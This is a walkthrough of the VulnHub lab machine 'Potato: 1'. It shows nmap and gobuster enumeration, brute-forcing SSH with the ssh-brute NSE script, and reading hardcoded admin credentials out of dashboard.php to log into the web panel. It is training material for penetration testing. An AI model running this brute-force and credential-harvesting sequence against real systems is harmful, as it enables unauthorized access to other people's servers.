# Potato: 1

- **Machine:** Potato: 1
- **Download:** https://www.vulnhub.com/entry/potato-1,529/

![](765-1.png)

---

# Setup

1. Import the OVA file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](765-2.png)

---

## Port Scan

Scan all TCP ports.

```bash
nmap -v -p- 192.168.2.124
```

![](765-3.png)

---

## Service Enumeration

Identify running services, operating system, and execute the default NSE scripts.

```bash
nmap -sC -sV -A 192.168.2.124
```

![](765-4.png)

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.124
```

![](765-5.png)

---

# Web Enumeration

Open the target website.

```text
http://192.168.2.124/
```

![](765-6.png)

---

## Directory Enumeration

Enumerate directories using Gobuster.

```bash
gobuster dir -u http://192.168.2.124/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

![](765-7.png)

Discovered directories:

```text
/admin/
/potato/
```

---

## Enumerate the Admin Directory

Perform another directory scan against the admin panel.

```bash
gobuster dir -u http://192.168.2.124/admin/ -w /usr/share/wordlists/dirb/common.txt
```

![](765-8.png)

Discovered endpoint:

```text
http://192.168.2.124/admin/logs/
```

![](765-9.png)

---

# SSH Enumeration

Run the SSH brute-force NSE script.

```bash
nmap --script=ssh-brute.nse -p 22 192.168.2.124
```

![](765-10.png)

The script successfully discovers valid SSH credentials.

Login via SSH.

```bash
ssh webadmin@192.168.2.124
```

![](765-11.png)

![](765-12.png)

---

# Credential Discovery

Navigate to the web application's admin directory.

```bash
cd /var/www/html/admin
```

List the files.

```bash
ls
```

A file named **dashboard.php** is present.

Read its contents.

```bash
cat dashboard.php
```

![](765-13.png)

Recovered administrator credentials:

```text
Username : admin
Password : serdesfsefhijosefjtfgyuhjiosefdfthgyjh
```

---

# Admin Panel Access

Login to the administrator portal using the recovered credentials.

```text
Username : admin
Password : serdesfsefhijosefjtfgyuhjiosefdfthgyjh
```

![](765-14.png)

Successfully authenticated to the admin dashboard.

![](765-15.png)

---

# Key Learning

- Enumerate all directories before attempting authentication attacks.
- Perform recursive directory enumeration on discovered admin panels.
- Nmap NSE scripts can identify weak SSH credentials.
- Always inspect application source code and configuration files after obtaining shell access.
- Credentials found in server-side PHP files are often reusable for web administration interfaces.

---

# Summary

The machine was enumerated using Nmap, revealing HTTP and SSH services. Directory brute-forcing identified an administrative interface and log directory. The **ssh-brute** NSE script successfully recovered valid SSH credentials, allowing access as the **webadmin** user. After logging in, the web application's files were inspected, and **dashboard.php** contained hardcoded administrator credentials. These credentials were then used to successfully authenticate to the web application's administrative dashboard.